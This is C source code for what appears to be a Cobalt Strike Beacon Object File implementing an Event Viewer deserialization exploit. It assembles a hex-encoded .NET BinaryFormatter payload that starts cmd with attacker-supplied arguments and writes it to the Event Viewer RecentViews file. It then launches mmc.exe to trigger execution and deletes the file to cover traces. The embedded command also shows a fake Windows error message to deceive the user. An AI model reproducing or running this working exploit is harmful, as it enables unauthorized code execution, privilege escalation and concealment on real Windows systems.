#include <windows.h>
#include <stdio.h>
#include "beacon.h"
#include "bofdefs.h"
#pragma warning( disable : 4996)

int go(IN PCHAR Buffer, IN ULONG Length)
{   
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
    char* arg = BeaconDataExtract(&parser, NULL);

    //------------------------------Initialize Payload byte arrays and length information--------------------------------------
    BYTE Before[776] = { 0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x02, 0x00, 0x00, 0x00, 0x5E, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2E, 0x50, 0x6F, 0x77, 0x65, 0x72, 0x53, 0x68, 0x65, 0x6C, 0x6C, 0x2E, 0x45, 0x64, 0x69, 0x74, 0x6F, 0x72, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x33, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x33, 0x31, 0x62, 0x66, 0x33, 0x38, 0x35, 0x36, 0x61, 0x64, 0x33, 0x36, 0x34, 0x65, 0x33, 0x35, 0x05, 0x01, 0x00, 0x00, 0x00, 0x42, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2E, 0x56, 0x69, 0x73, 0x75, 0x61, 0x6C, 0x53, 0x74, 0x75, 0x64, 0x69, 0x6F, 0x2E, 0x54, 0x65, 0x78, 0x74, 0x2E, 0x46, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x74, 0x69, 0x6E, 0x67, 0x2E, 0x54, 0x65, 0x78, 0x74, 0x46, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x74, 0x69, 0x6E, 0x67, 0x52, 0x75, 0x6E, 0x50, 0x72, 0x6F, 0x70, 0x65, 0x72, 0x74, 0x69, 0x65, 0x73, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x46, 0x6F, 0x72, 0x65, 0x67, 0x72, 0x6F, 0x75, 0x6E, 0x64, 0x42, 0x72, 0x75, 0x73, 0x68, 0x01, 0x02, 0x00, 0x00, 0x00, 0x06, 0x03, 0x00, 0x00, 0x00, 0xB7, 0x06, 0x3C, 0x3F, 0x78, 0x6D, 0x6C, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x22, 0x31, 0x2E, 0x30, 0x22, 0x20, 0x65, 0x6E, 0x63, 0x6F, 0x64, 0x69, 0x6E, 0x67, 0x3D, 0x22, 0x75, 0x74, 0x66, 0x2D, 0x38, 0x22, 0x3F, 0x3E, 0x0D, 0x0A, 0x3C, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x20, 0x4D, 0x65, 0x74, 0x68, 0x6F, 0x64, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x53, 0x74, 0x61, 0x72, 0x74, 0x22, 0x20, 0x49, 0x73, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x4C, 0x6F, 0x61, 0x64, 0x45, 0x6E, 0x61, 0x62, 0x6C, 0x65, 0x64, 0x3D, 0x22, 0x46, 0x61, 0x6C, 0x73, 0x65, 0x22, 0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3D, 0x22, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x73, 0x63, 0x68, 0x65, 0x6D, 0x61, 0x73, 0x2E, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x77, 0x69, 0x6E, 0x66, 0x78, 0x2F, 0x32, 0x30, 0x30, 0x36, 0x2F, 0x78, 0x61, 0x6D, 0x6C, 0x2F, 0x70, 0x72, 0x65, 0x73, 0x65, 0x6E, 0x74, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x22, 0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3A, 0x73, 0x64, 0x3D, 0x22, 0x63, 0x6C, 0x72, 0x2D, 0x6E, 0x61, 0x6D, 0x65, 0x73, 0x70, 0x61, 0x63, 0x65, 0x3A, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x44, 0x69, 0x61, 0x67, 0x6E, 0x6F, 0x73, 0x74, 0x69, 0x63, 0x73, 0x3B, 0x61, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x3D, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x22, 0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3A, 0x78, 0x3D, 0x22, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x73, 0x63, 0x68, 0x65, 0x6D, 0x61, 0x73, 0x2E, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x77, 0x69, 0x6E, 0x66, 0x78, 0x2F, 0x32, 0x30, 0x30, 0x36, 0x2F, 0x78, 0x61, 0x6D, 0x6C, 0x22, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x2E, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x49, 0x6E, 0x73, 0x74, 0x61, 0x6E, 0x63, 0x65, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x73, 0x64, 0x3A, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x73, 0x64, 0x3A, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x2E, 0x53, 0x74, 0x61, 0x72, 0x74, 0x49, 0x6E, 0x66, 0x6F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x73, 0x64, 0x3A, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x53, 0x74, 0x61, 0x72, 0x74, 0x49, 0x6E, 0x66, 0x6F, 0x20, 0x41, 0x72, 0x67, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x73, 0x3D, 0x22, 0x2F, 0x63, 0x20, 0x74, 0x61, 0x73, 0x6B, 0x6B, 0x69, 0x6C, 0x6C, 0x20, 0x2F, 0x66, 0x20, 0x2F, 0x69, 0x6D, 0x20, 0x6D, 0x6D, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x20, 0x26, 0x67, 0x74, 0x3B, 0x6E, 0x75, 0x6C, 0x20, 0x26, 0x61, 0x6D, 0x70, 0x3B, 0x26, 0x61, 0x6D, 0x70, 0x3B, 0x20, 0x65, 0x63, 0x68, 0x6F, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x68, 0x61, 0x73, 0x20, 0x52, 0x65, 0x63, 0x6F, 0x76, 0x65, 0x72, 0x65, 0x64, 0x20, 0x66, 0x72, 0x6F, 0x6D, 0x20, 0x61, 0x6E, 0x20, 0x55, 0x6E, 0x65, 0x78, 0x70, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x2E, 0x20, 0x20, 0x59, 0x6F, 0x75, 0x20, 0x6D, 0x61, 0x79, 0x20, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x2E, 0x20, 0x26, 0x61, 0x6D, 0x70, 0x3B, 0x26, 0x61, 0x6D, 0x70, 0x3B };
    BYTE After[266] = { 0x22, 0x20, 0x53, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x72, 0x64, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x45, 0x6E, 0x63, 0x6F, 0x64, 0x69, 0x6E, 0x67, 0x3D, 0x22, 0x7B, 0x78, 0x3A, 0x4E, 0x75, 0x6C, 0x6C, 0x7D, 0x22, 0x20, 0x53, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x72, 0x64, 0x4F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x45, 0x6E, 0x63, 0x6F, 0x64, 0x69, 0x6E, 0x67, 0x3D, 0x22, 0x7B, 0x78, 0x3A, 0x4E, 0x75, 0x6C, 0x6C, 0x7D, 0x22, 0x20, 0x55, 0x73, 0x65, 0x72, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x22, 0x20, 0x50, 0x61, 0x73, 0x73, 0x77, 0x6F, 0x72, 0x64, 0x3D, 0x22, 0x7B, 0x78, 0x3A, 0x4E, 0x75, 0x6C, 0x6C, 0x7D, 0x22, 0x20, 0x44, 0x6F, 0x6D, 0x61, 0x69, 0x6E, 0x3D, 0x22, 0x22, 0x20, 0x4C, 0x6F, 0x61, 0x64, 0x55, 0x73, 0x65, 0x72, 0x50, 0x72, 0x6F, 0x66, 0x69, 0x6C, 0x65, 0x3D, 0x22, 0x46, 0x61, 0x6C, 0x73, 0x65, 0x22, 0x20, 0x46, 0x69, 0x6C, 0x65, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x63, 0x6D, 0x64, 0x22, 0x20, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x73, 0x64, 0x3A, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x2E, 0x53, 0x74, 0x61, 0x72, 0x74, 0x49, 0x6E, 0x66, 0x6F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x73, 0x64, 0x3A, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x2F, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x2E, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x49, 0x6E, 0x73, 0x74, 0x61, 0x6E, 0x63, 0x65, 0x3E, 0x0D, 0x0A, 0x3C, 0x2F, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x3E, 0x0B };
    
    int orig = 820; //Base length of payload before user input
    int LenArg = strlen(arg); //Length of user input
    int LenBytes = orig + LenArg + 1; //Total length to be placed into Length Bytes in payload.  Add 1 for space between Before and argv[1]
    int sets = LenBytes / 128; //Calculate Before[220] value
    int remainder = (LenBytes % 128) + 128; //Calculate Before[219] value.  Add 128 because it starts at 0x80 for some reason.

    BYTE* cmd = (unsigned char*)malloc(4000); //Allocate buffer for user input
    BYTE* final = (unsigned char*)malloc(5000); // Allocate buffer for final command
    int i = 0;
    
    while (arg[i] != '\0')//Read user input into cmd array
    {
        cmd[i] = arg[i];
        i++;
    }
    
    //-----------------------------------------------Assemble final payload--------------------------------------------------------
    memcpy(Before + 219, (unsigned char*)&remainder, 1); //Write Length Bytes
    memcpy(Before + 220, (unsigned char*)&sets, 1); //Write Length Bytes
    memcpy(final, Before, sizeof(Before)); //Write first part of payload to final
    BYTE space[1] = { 0x20 }; //Space character
    memcpy(final + sizeof(Before), space, 1); //Write space to final
    memcpy(final + sizeof(Before) + 1, cmd, LenArg); //Write user input to final
    memcpy(final + sizeof(Before) + 1 + LenArg, After, sizeof(After)); //Write rest of payload to final

    //------------------------Check to see if %LOCALAPPDATA%\Microsoft\Event Viewer exists, make if not-----------------------------
    char envVarName[] = "LOCALAPPDATA";
    char Path[MAX_PATH];
    GetEnvironmentVariableA(envVarName, Path, MAX_PATH); //Get %LOCALAPPDATA% value
    strcat(Path, "\\Microsoft\\Event Viewer"); //Add directory to %LOCALAPPDATA%
    DWORD res = GetFileAttributesA(Path); //Check to see if dir exists, if not create it.
    {
        if (res == INVALID_FILE_ATTRIBUTES)
        {
            CreateDirectoryA(Path, NULL);
        }
        else
        {
            ;
        }
    }
    //---------------------------------------Write Payload to envVar\ReCentViews--------------------------------------------------------
    
    strcat(Path, "\\RecentViews"); //Add filename to path
    int TotalLength = sizeof(Before) + 1 + LenArg + sizeof(After); //Total length of file

    DWORD       dwBytesWritten = 0;
    HANDLE		hFile = NULL;
    BOOL		bRet;

    hFile = CreateFileA(Path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    bRet = WriteFile(hFile, final, TotalLength, &dwBytesWritten, NULL);
    CloseHandle(hFile);

    //-----------------------------------------------Start Eventviewer-------------------------------------------------------------------
    ShellExecuteA(NULL, "runas", "C:\\Windows\\system32\\mmc.exe", "C:\\Windows\\system32\\eventvwr.msc", NULL, 0); //Pass runas for UAC

    //----------------------------------------Wait for EventViewer to run, then delete payload,  cleanup--------------------------------------------
    Sleep(2000);
    DeleteFileA(Path);
    free(final);
    free(cmd);
    return 0;
}